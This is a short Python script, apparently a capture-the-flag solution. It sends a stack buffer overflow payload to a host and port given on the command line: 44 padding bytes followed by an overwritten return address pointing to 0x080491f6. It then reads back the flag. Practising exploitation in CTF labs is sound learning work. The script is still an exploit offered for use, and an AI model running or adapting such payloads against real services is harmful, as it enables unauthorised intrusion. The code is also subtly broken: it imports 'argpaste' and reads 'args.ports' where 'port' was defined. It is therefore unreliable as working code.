# buffer overload 01
import argpaste
import socket

# Accept arguments 'url' and 'ports'

parser = argparse.ArgumentParser()
parser.add_argument(
	"url",
	type = str,
	help = "The hostname or IP Address of target")
parser.add_argument(
	"port",
	type = int,
	help = "The port number")
args = parser.parse_args()

print("your arguments were " + args.url + " & " + str(args.port))
# Define payload
# payload data 080491f6

payload = b"".join([
	b"A" * 44,
	b"\xf6\x91\x04\x08",         #\x08\x04\x91\xf6,
	b"\n"
])

# Make network connection to url at port
with socket.socket() as connection:
	connection.connect((args.url,args.ports))
	print(connection.recv(4096).decode("utf-8"))
# Send payload
	connection.send(payload)
	print(connection.recv(4096).decode("utf-8"))
# Get flag
	print(connection.recv(4096).decode("utf-8"))
